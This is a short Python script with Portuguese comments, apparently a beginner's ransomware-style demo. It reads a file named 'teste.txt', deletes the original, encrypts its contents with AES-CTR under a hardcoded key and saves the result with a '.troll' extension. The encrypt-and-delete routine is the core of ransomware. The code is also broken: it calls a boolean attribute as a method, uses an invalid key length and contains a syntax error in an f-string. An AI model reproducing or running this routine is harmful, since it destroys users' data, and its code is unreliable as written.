import os
import pyaes

print('iniciando criptografia')

##abre o arquivo para criptografar
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.closed()

## deleta o arquivo
os.remove(file_name)

##chave da criptografia
key = "UjcoBvygEEdD4fsV2t3jug"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografa o arquivo
crypto_data = aes.encrypt(file_data)

## salva o arquivo
new_file = file_name + ".troll"
new_file = open(f'{new file}', 'wb')
new_file.write(crypto_data)
new_file.close()

print('arquivo criptografado')